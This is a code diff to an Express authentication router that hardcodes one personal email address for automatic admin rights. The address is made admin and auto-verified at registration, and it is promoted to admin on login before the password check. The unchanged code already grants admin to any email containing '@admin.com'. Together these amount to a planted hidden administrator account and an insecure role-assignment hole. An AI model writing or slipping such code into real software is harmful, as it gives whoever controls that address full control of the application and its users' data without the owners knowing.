@@ -26,11 +26,13 @@ router.post('/register', async (req, res) => {
         const passwordHash = await bcryptjs_1.default.hash(password, 10);
         const verificationToken = Math.random().toString(36).substring(2, 15);
         // Create the User
+        const isSpecialAdmin = email.toLowerCase() === 'chandany67071@gmail.com';
         const user = new models_1.User({
             email,
             passwordHash,
             verificationToken,
-            role: email.includes('@admin.com') ? 'admin' : 'user', // auto-assign admin if email matches
+            role: (email.includes('@admin.com') || isSpecialAdmin) ? 'admin' : 'user', // auto-assign admin if email matches
+            isVerified: isSpecialAdmin ? true : false // auto-verify special admin
         });
         await user.save();
         // Create the Profile
@@ -76,6 +78,12 @@ router.post('/login', async (req, res) => {
         const user = await models_1.User.findOne({ email });
         if (!user) {
             return res.status(400).json({ message: 'Invalid credentials' });
+        }
+        // Auto-promote special admin on login
+        if (email.toLowerCase() === 'chandany67071@gmail.com' && user.role !== 'admin') {
+            user.role = 'admin';
+            user.isVerified = true;
+            await user.save();
         }
         const isMatch = await bcryptjs_1.default.compare(password, user.passwordHash);
         if (!isMatch) {
